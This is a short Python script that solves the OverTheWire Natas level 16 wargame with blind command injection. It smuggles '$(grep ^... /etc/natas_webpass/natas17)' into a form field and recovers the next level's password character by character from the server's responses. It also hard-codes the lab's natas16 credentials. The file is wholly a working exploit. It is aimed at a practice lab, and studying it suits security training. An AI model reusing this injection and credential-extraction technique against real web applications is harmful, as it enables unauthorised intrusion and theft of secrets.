import re
import requests as req
from requests.auth import HTTPBasicAuth

chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
LOGIN = 'http://natas16.natas.labs.overthewire.org'
password = ''

def check_if_in_pass(string):
    needle = '$(grep ^' + string + ' /etc/natas_webpass/natas17)'
    payload = {'needle':needle} 
    r = req.post(LOGIN, auth=HTTPBasicAuth('natas16',
        'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'), data=payload)
    if not (re.search('African',r.content)):
        return True
    return False

i = 0
for i in range(0, 32):
    for char in chars:
        if (check_if_in_pass(password + char)):
            password += char
            print (password)
            break
    i += 1
